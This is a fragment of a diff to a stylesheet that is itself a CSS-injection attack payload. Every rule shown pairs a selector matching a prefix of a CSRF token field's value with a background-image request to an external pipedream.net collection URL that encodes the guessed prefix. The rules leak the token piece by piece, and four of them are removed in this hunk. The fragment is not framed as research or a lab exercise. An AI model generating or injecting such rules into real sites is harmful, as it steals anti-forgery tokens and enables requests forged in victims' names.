@@ -550,22 +550,6 @@ input.csrf[value^='yVt&']{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/yVt&);
 }
 
-input.csrf[value^='ruW(']{
-    background-image: url(https://ent28xtybmafr.x.pipedream.net/ruW();
-}
-
-input.csrf[value^='yVt(']{
-    background-image: url(https://ent28xtybmafr.x.pipedream.net/yVt();
-}
-
-input.csrf[value^='ruW)']{
-    background-image: url(https://ent28xtybmafr.x.pipedream.net/ruW));
-}
-
-input.csrf[value^='yVt)']{
-    background-image: url(https://ent28xtybmafr.x.pipedream.net/yVt));
-}
-
 input.csrf[value^='ruW*']{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/ruW*);
 }
